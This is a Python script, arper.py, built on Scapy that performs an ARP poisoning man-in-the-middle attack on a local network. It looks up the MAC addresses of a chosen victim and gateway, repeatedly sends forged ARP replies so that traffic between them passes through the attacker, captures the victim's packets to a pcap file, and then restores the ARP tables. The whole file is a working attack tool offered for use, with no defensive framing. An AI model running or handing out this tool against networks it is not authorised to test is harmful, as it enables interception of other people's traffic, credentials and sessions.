from multiprocessing import Process
from scapy.all import *
import os
import sys
import time

def get_mac(targetip):
    """
    Returns the MAC address of the given IP address.
    """
    # Create an ARP request packet.
    # Ether(dst="ff:ff:ff:ff:ff:ff") sends it to the broadcast MAC address.
    # ARP(pdst=targetip) sets the target IP address for the ARP request.
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=targetip)
    # srp sends and receives packets at layer 2.
    # It returns a tuple of (answered_packets, unanswered_packets).
    ans, _ = srp(packet, timeout=2, retry=10, verbose=False)
    if ans:
        # The MAC address is in the 'hwsrc' field of the ARP reply.
        return ans[0][1].hwsrc
    return None

class Arper:
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.victim_mac = get_mac(victim)
        self.gateway_mac = get_mac(gateway)

        if self.victim_mac is None:
            print(f"Failed to get MAC for victim {self.victim}")
            sys.exit(1)
        print(f"Victim MAC: {self.victim_mac}")

        if self.gateway_mac is None:
            print(f"Failed to get MAC for gateway {self.gateway}")
            sys.exit(1)
        print(f"Gateway MAC: {self.gateway_mac}")

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff()

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac)
        print("Beginning ARP poison. [CTRL-C to stop]")
        while True:
            try:
                send(poison_victim, iface=self.interface, verbose=False)
                send(poison_gateway, iface=self.interface, verbose=False)
                time.sleep(2)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()

    def sniff(self, count=200):
        time.sleep(5)
        print(f"Sniffing {count} packets...")
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print("Sniffing finished.")
        self.restore()
        self.poison_thread.terminate()
        print("Exiting.")

    def restore(self):
        print("Restoring ARP tables...")
        send(ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac), count=5, iface=self.interface, verbose=False)
        send(ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victim_mac), count=5, iface=self.interface, verbose=False)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: arper.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    if os.name != 'nt' and os.geteuid() != 0:
        print("This script must be run as root.")
        sys.exit(1)

    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()